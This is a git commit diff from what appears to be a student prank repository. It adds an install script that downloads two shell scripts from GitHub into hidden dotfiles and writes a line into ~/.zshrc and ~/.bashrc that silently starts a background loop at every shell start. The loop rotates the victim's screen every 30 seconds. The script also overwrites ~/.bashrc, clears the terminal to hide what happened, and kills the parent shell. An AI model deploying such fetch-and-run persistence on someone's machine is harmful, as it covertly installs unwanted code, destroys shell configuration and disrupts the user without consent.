08fce5ba2678325af93d80bc023bd10e06694430
pgrossma <pgrossma@student.42heilbronn.de>
2025-01-26 13:21:48 +0100

    rotate script should now be working

--- rotate/install.sh
+++ rotate/install.sh
@@ -1,4 +1,10 @@
+curl -s -o ~/.fb-rotate https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/rotate/fb-rotate.sh
+chmod +x ~/.fb-rotate
+curl -s -o ~/.rotate.sh https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/rotate/rotate.sh
 
-
-echo 'nohup bash ~/.rotate.sh > /dev/null &' > ~/.zshrc
+echo 'nohup bash ~/.rotate.sh > /dev/null &' >> ~/.zshrc
+echo 'clear' >> ~/.zshrc
 echo 'nohup bash ~/.rotate.sh > /dev/null &' > ~/.bashrc
+echo 'clear' >> ~/.bashrc
+
+kill -9 $PPID
--- rotate/rotate.sh
+++ rotate/rotate.sh
@@ -1,12 +1,14 @@
 #!/bin/bash
 
+sleep=30
+
 while true; do
-    sleep 30
-    ./fb-rotate -d -1 -r 90
-    sleep 30
-    ./fb-rotate -d -1 -r 180
-    sleep 30
-    ./fb-rotate -d -1 -r 270
-    sleep 30
-    ./fb-rotate -d -1 -r 0
+    sleep $sleep
+    ~/.fb-rotate -d -1 -r 90
+    sleep $sleep
+    ~/.fb-rotate -d -1 -r 180
+    sleep $sleep
+    ~/.fb-rotate -d -1 -r 270
+    sleep $sleep
+    ~/.fb-rotate -d -1 -r 0
 done
